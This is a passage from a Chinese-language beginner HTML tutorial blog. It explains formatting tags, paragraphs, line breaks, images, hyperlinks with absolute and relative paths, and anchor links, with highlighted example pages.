align="left">下划线underline。如：<code>&lt;u&gt;HTML文本&lt;/u&gt;</code>----&gt; <u>HTML文本</u></td></tr><tr><td align="left"><strong><code>&lt;s&gt;&lt;/s&gt;</code></strong></td><td align="left">删除线strike。如：<code>&lt;s&gt;删除线&lt;/s&gt;</code>----&gt; <s>删除线</s></td></tr><tr><td align="left"><strong><code>&lt;sup&gt;&lt;/sup&gt;</code></strong></td><td align="left">上标，如：<code>3&lt;sup&gt;x&lt;/sup&gt;</code> ----&gt; 3<sup>x</sup></td></tr><tr><td align="left"><strong><code>&lt;sub&gt;&lt;/sub&gt;</code></strong></td><td align="left">下标，如：<code>6&lt;sub&gt;5&lt;/sub&gt;</code> ----&gt; 6<sub>5</sub></td></tr><tr><td align="left"><strong><code>&lt;font&gt;&lt;/font&gt;</code></strong></td><td align="left">字体标记，如：<code>&lt;font size=&quot;4&quot; color=&quot;red&quot; face=&quot;Comic sans MS&quot;&gt;Demo&lt;/font&gt;</code><font size="4" color="red" face="Comic sans MS">Demo</font></td></tr><tr><td align="left"><strong><code>size</code></strong></td><td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。文本大小，取值1-7（1小，7大）</td></tr><tr><td align="left"><strong><code>color</code></strong></td><td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。颜色值</td></tr><tr><td align="left"><strong><code>face</code></strong></td><td align="left"><code>&lt;font&gt;&lt;font&gt;</code>的属性。字体，楷体、黑体、宋体</td></tr></tbody></table></div></div><br><br><p><font size="4" face="Microsoft YaHei"><strong>4. <code>&lt;p&gt;&lt;/p&gt;</code>表示一个段落</strong></font></p><p>属性及取值如下：</p><div class="article-bounded"><div class="article-table"><table><thead><tr><th align="left">属性</th><th align="left">值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">align</td><td align="left">left<br>right<br>center<br>justify</td><td align="left">HTML5不支持。 HTML 4.01已废弃。 <br>不赞成使用。请使用样式取代它。 规定段落中文</td></tr></tbody></table></div></div><br><br><p><font size="4" face="Microsoft YaHei"><strong>5. <code>&lt;br&gt;</code> 标签</strong></font></p><p><code>&lt;br&gt;</code> 标签插入一个简单的换行符。<code>&lt;br&gt;</code> 标签是一个空标签，意味着它没有结束</p><p><strong>提示：</strong>在<font color="#FF7F00"><strong>写地址信息或者写诗词时 <code>&lt;br&gt;</code> 标签非常有用</strong></font>。</p><p><strong>注释：</strong> 请<font color="#FF7F00"><strong>使用 <code>&lt;br&gt;</code> 标签来输入空行，而不是分割段落</strong></font>。</p><p>在 HTML 中，<code>&lt;br&gt;</code> 标签没有结束标签。</p><p>在 XHTML 中，<code>&lt;br&gt;</code> 标签必须被正确地关闭，比如这样：<code>&lt;br /&gt;</code> 。</p><br><br><p><font size="4" face="Microsoft YaHei"><strong>6. <code>&lt;hr&gt;</code> 标签</strong></font></p><div class="article-img"><p><img src="https://i.loli.net/2019/03/08/5c82523cb9d72.png" alt="6.png" data-zoomable></p></div><br><br><p><font size="4" face="Microsoft YaHei"><strong>7. <code>&lt;pre&gt;&lt;/pre&gt;</code> <code>&lt;code&gt;&lt;/code&gt;</code></strong></font></p><p><strong><code>&lt;pre&gt;</code>预排版标记</strong></p><p>功能：将保留所有的空白字符(空格、换行符)，换句话说：就是原封不动输出。<br>可参读：<font color="#00B2EE">《<a href="https://www.jianshu.com/p/6abc36c28e45" target="_blank" rel="noopener">html &lt;.code&gt;&amp;&lt;.pre&gt;</a>》</font> </p><br><br><p><font size="4" face="Microsoft YaHei"><strong>8. <code>&lt;strong&gt;</code>和 <code>&lt;em&gt;</code></strong></font></p><ul><li><p>有了段落又有了标题，现在如果想在一段话中特别强调某几个文字，这时候就可以用到<code>&lt;em&gt;</code>或<code>&lt;strong&gt;</code>标签。</p></li><li><p>但两者在强调的语气上有区别:<code>&lt;em&gt;</code> 表示强调，<code>&lt;strong&gt;</code>表示更强烈的强调。并且在浏览器中<code>&lt;em&gt;</code> 默认用斜体表示，<code>&lt;strong&gt;</code> 用粗体表示。两个标签相比，目前国内前端程序员更喜欢使用<code>&lt;strong&gt;</code>表示强调。</p></li><li><p><font color="#FF7F00"><strong><code>&lt;em&gt;</code>的内容在浏览中显示为斜体，<code>&lt;strong&gt;</code>显示为加粗</strong></font>。如果不喜欢这种样式，没有关系，以后可以使用css样式去改变它。</p></li></ul><br><br><p><font size="4" face="Microsoft YaHei"><strong>9. <code>&lt;span&gt;&lt;/span&gt;</code>&gt;</strong></font></p><ul><li><p><code>&lt;span&gt;</code> 标签被用来组合文档中的行内元素。span 没有固定的格式表现。当对它应用样式时，它才会产生视觉上的变化。如果不对 <code>&lt;span&gt;</code> 应用样式，那么 <code>&lt;span&gt;</code> 元素中的文本与其他文本不会任何视觉上的差异。</p></li><li><p><code>&lt;span&gt;</code> 标签提供了一种将文本的一部分或者文档的一部分独立出来的方式。</p></li><li><p>被 <code>&lt;span&gt;</code> 元素包含的文本，您可以使用 CSS 对它定义样式，或者使用 JavaScript 对它进行操作。</p></li></ul><br><br><h4 id="2-3-常用标签-链接和图像"><font color="#3CB371" face="Comic sans MS">2.3 常用标签-链接和图像</font><a href="post/HTML-basics#2-3-常用标签-链接和图像"></a></h4><h5 id="一-image图像"><font color="#00B2EE" face="Microsoft YaHei">一. image图像</font><a href="post/HTML-basics#一-image图像"></a></h5><p><strong>注：</strong>这是一个单边标签</p><p><font color="#00B2EE" face="Microsoft YaHei"></font></p><ul><li><input checked disabled type="checkbox"> <strong><code>&lt;img&gt;</code></strong> 单边标签，它只包含属性，并且没有闭合标签。<ul><li><input checked disabled type="checkbox"> <strong>必须属性</strong> ↓↓<ul><li><input checked disabled type="checkbox"> <strong><code>src</code></strong>：地址。src 指 “source”。源属性的值是图像的 URL 地址。语法：<code>&lt;img src=&quot;url&quot; alt=&quot;some_text&quot;&gt;</code></li><li><input checked disabled type="checkbox"> <strong><code>alt</code></strong>：图像替代文本，在浏览器无法载入图像时，浏览器将显示这个替代性的文本而不是图像。语法：<code>&lt;img src=&quot;../style/images/boat.gif&quot; alt=&quot;Big Boat&quot;&gt;</code></li></ul></li><li><input disabled type="checkbox"> <strong>可选属性</strong> ↓↓<ul><li><input disabled type="checkbox"> <strong><code>height</code></strong>：图像高度，默认单位为像素</li><li><input disabled type="checkbox"> <strong><code>width</code></strong> ：图像宽度，默认单位为像素</li><li><input disabled type="checkbox"> <strong><code>ismap</code></strong> ：为图像定义为服务器端图像映射</li></ul></li></ul></li></ul><br><p><strong>注：</strong>可以尝试输入其他属性看看效果，想要让图片居中，只能通过CSS。</p><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span></span>Life was like a box of chocolates<span class="token punctuation">,</span> you never know what you're gonna get<span class="token punctuation">.</span>（生命就像一盒巧克力，结果往往出人意料。）<span class="token operator">--</span><span class="token operator">-</span>《阿甘正传》  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://s2.ax1x.com/2019/03/04/kOxQJS.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/09/5c83893d59c1b.png" alt="11.png" data-zoomable></p></div><br><h5 id="二-超级链接"><font color="#00B2EE" face="Microsoft YaHei">二. 超级链接</font><a href="post/HTML-basics#二-超级链接"></a></h5><p>请注意<font color="#FF7F00"><strong>超级链接和锚点链接是不一样滴……</strong></font></p><p>网站中随处可见超级链接的身影，打开百度新闻，任意点击一段话，就会打开新闻详情页，这全部都是超级链接</p><p><strong>语法格式：<code>&lt;a  属性 = “值”&gt;……&lt;/a&gt;</code></strong><br><strong>注：</strong><code>&lt;a&gt;</code>中不能再套<code>&lt;a&gt;</code>标记</p><br><p><font face="Microsoft YaHei" color="#20B2AA"><strong>1. 标签</strong></font> </p><ul><li><input checked disabled type="checkbox"> <strong><code>&lt;a&gt;&lt;/a&gt;</code></strong> 超级链接，中间是文本提示，常用属性:<ul><li><input checked disabled type="checkbox"> <strong><code>href</code></strong>：目标文件的地址URL（该URL可以是相对地址，也可以是绝对地址）</li><li><input checked disabled type="checkbox"> <strong><code>target</code></strong>：目标文件的显示窗口的方法：<ul><li><input disabled type="checkbox"> <strong><code>_blank</code></strong>：在新窗口中打开目标文件。</li><li><input disabled type="checkbox"> <strong><code>_self</code></strong>：在当前窗口中打开目标文件(默认打开)，相当于“替换”当前页面操作。</li><li><input disabled type="checkbox"> <strong><code>_parent</code></strong>：在父级窗口来打开目标文件。常用框架网页中</li><li><input disabled type="checkbox"> <strong><code>_top</code></strong>：在最顶级窗口来打开目标文件。常用框架网页中</li></ul></li></ul></li></ul><br><p><font face="Microsoft YaHei" color="#20B2AA"><strong>2. 绝对地址URL</strong></font> </p><p><strong>（1）远程的绝对地址</strong>：直接输入远程绝对路径</p><ol><li>访问远程的文件，总是以<code>&lt;a href=&quot;http://域名/主机名..&quot;&gt;提示文本&lt;/a&gt;</code><br>如：<code>&lt;a href=&quot;https://Treecatee.github.io&quot; target=&quot;_blank&quot;&gt;Treecatee.github.io&lt;/a&gt;</code></li></ol><br><p><strong>（2）本地的绝对地址(很少使用)</strong>：访问本地绝对的路径文件</p><ol><li>访问本地的绝对地址，是以<code>&lt;a href=&quot;http://file:///开头的绝对地址。&quot;&gt;file:///开头的绝对地址。&lt;/a&gt;</code><br>如：<code>&lt;a href=&quot;file:///D:/image.html&quot; target=&quot;_blank&quot;&gt;</code></li></ol><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://treecatee.github.io<span class="token punctuation">"</span></span>  <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>远程绝对路径访问，哈哈哈😁<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>file:///D:/image.html<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token punctuation">(</span>。・∀・<span class="token punctuation">)</span>ノ本地绝对路径访问，不要忘记“<span class="token operator">/</span> <span class="token operator">/</span> <span class="token operator">/</span>”<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><div class="article-img"><p><img src="https://i.loli.net/2019/03/09/5c8399a12d344.png" alt="12.png" data-zoomable></p></div><p><font face="Microsoft YaHei" color="#20B2AA"><strong>3. 相对地址URL</strong>（项目中路径一般是相对路径）</font> </p><p>（1）当前文件和目标文件是<strong>同级关系</strong>，链接地址直接写目标文件名。</p><p>（2）当前文件与<strong>目标文件所在的文件夹是同级关系</strong>，先找“文件夹名”，然后再找“文件名”。</p><p>（3）目标文件位于<strong>上一层目录中</strong>，往上找对应的目录，再找目录中的文件。</p><ol><li><strong>注意：</strong><ol><li><strong><code>./</code></strong>代表当前目录，默认使用</li><li><strong><code>../</code></strong>代表上一级目录</li><li><strong><code>../../</code></strong>代表上两级目录</li></ol></li></ol><br><p>示例：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>     <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>./tina.html<span class="token punctuation">"</span></span>  <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>同级目录下的本地相对路径链接，哈哈哈😁<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span></span>   <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../test/2.html<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>上级目录下的本地相对路径链接 <span class="token punctuation">(</span>。・∀・<span class="token punctuation">)</span>ノ<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>../../dream/hap.mp3<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>上上级目录下的本地相对路径链接 ♪<span class="token punctuation">(</span>´▽｀<span class="token punctuation">)</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p><font face="Microsoft YaHei" color="#20B2AA"><strong>4. 特殊的链接</strong></font> </p><p>(1) 下载链接</p><ol><li><p>这些文件网页可以直接执行，如：.jpg、.png、.gif、.html、.htm、.txt等。</p></li><li><p>大部分文件，浏览器是不能直接执行的。如：.doc、.xls、.ppt、.rar、.psd……</p></li></ol><p>(2) 邮箱链接</p><p>(3) 普通空链接（#）如：<code>&lt;a href=&quot;#&quot;&gt;这是一个空链接&lt;/a&gt;</code></p><br><h5 id="三-锚点链接"><font color="#00B2EE" face="Microsoft YaHei">三. 锚点链接</font><a href="post/HTML-basics#三-锚点链接"></a></h5><p><strong><code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code></strong> ：定义锚点，做个记号<br><strong><code>&lt;a href=&quot;[文件名]#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code></strong> ：记号，功能是跳到做记号的地方</p><p>分为当前页面跳转和跨页面跳转，页内跳转时不用文件名，跨页跳转时用。</p><br><blockquote><ol><li>锚点是什么？</li><li>为什么要用锚点？</li><li>锚点怎么用？</li></ol></blockquote><br><ol><li><strong>锚点是什么？</strong></li></ol><p>如我们在做一个很长的网页时，需要在页面内做一个导航，点击导航里的链接不是新开一个窗口或者跳转到其他网址，而是<font color="#FF7F00"><strong>跳转到当前页的某一个位置</strong></font>。那么所要跳转到的那个位置，我们就叫做<font color="#FF7F00"><strong>锚点</strong></font>，它是一种<font color="#FF7F00"><strong>在页面内部定位的方式</strong></font>。</p><ol start="2"><li><strong>为什么要用锚点？</strong></li></ol><p>在写项目的时候，页面比较长，这时候需要设置锚点进行<font color="#FF7F00"><strong>快速定位</strong></font>到某个段落或某个位置。</p><ol start="3"><li><strong>锚点怎么用？</strong></li></ol><p>分为当前页面跳转或者跨页面跳转：</p><ul><li><input checked disabled type="checkbox"> <strong>定义锚点</strong>(作个记号)：用于定位的目的地。不管是当前当前页面内还是跨页跳转定义方法都一样；<ul><li><input disabled type="checkbox"> 定义方法：<strong><code>&lt;a id=&quot;锚点名称&quot;&gt;&lt;/a&gt;</code></strong>或<strong><code>&lt;h2 id=&quot;锚点名称&quot;&gt;&lt;/h2&gt;</code></strong>或…..</li><li><input checked disabled type="checkbox"> 锚点名称命名规则：<ul><li><input disabled type="checkbox"> 可以包含字母、数字、下划线，但<font color="#FF7F00"><strong>只能以字母开头</strong></font>。</li></ul></li></ul></li><li><input checked disabled type="checkbox"> <strong>锚点</strong>（触发），也称为记号。<ul><li><input disabled type="checkbox"> 跳到当前页面定义方法：<strong><code>&lt;a  href=&quot;#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code></strong></li><li><input disabled type="checkbox"> 跨页面跳转定义方法：<strong><code>&lt;a  href=&quot;目标页面路径#锚点名称&quot;&gt;提示文本（必须有）&lt;/a&gt;</code></strong></li></ul></li><li><input checked disabled type="checkbox"> <strong><code>id</code></strong>或<strong><code>name</code></strong>：定义锚点链接的名称。<ul><li><input disabled type="checkbox"> name是老方法，id是在name基础上发明的，后来才有的。</li><li><input disabled type="checkbox"> 使用name属性设置锚点很方便但<font color="#FF7F00"><strong>只能针对a标签来使用</strong></font>，具有一定的局限性。而对div等其他没有name属性的标签就不能起到作用了。</li><li><input disabled type="checkbox"> id兼容性很好。</li></ul></li></ul><br><p>示例（页内跳转）：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>            <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--设置锚点，索引功能--></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>点击我就会跳到第一段<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>        <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>点击我就会跳到第二段<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#c<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>点击我就会跳到第三段<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>                   <span class="token punctuation">.</span>                   <span class="token punctuation">.</span>                   <span class="token punctuation">.</span>                   <span class="token punctuation">.</span>              <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--做记号--></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>我是标题一<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>我是标题二<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>c<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>我是标题三<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span></span>  　　      <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>返回新闻顶部<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>　　  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>                 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><br><p>示例（跨内跳转）：</p><pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE HTML></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Content-Type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html; charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span>                 <span class="token markup"><span class="token comment" spellcheck="true">&lt;!--设置锚点，索引功能,然后在目的页面做好记号--></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://treecatee.github.io#a<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>点击我就会跳到第一段<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>         <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://directoree.top#b<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>点击我就会跳到第二段<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span>       <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://taobao.com#c<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>点击我就会跳到第三段<span class="token markup"><span class="token tag"><span class="token 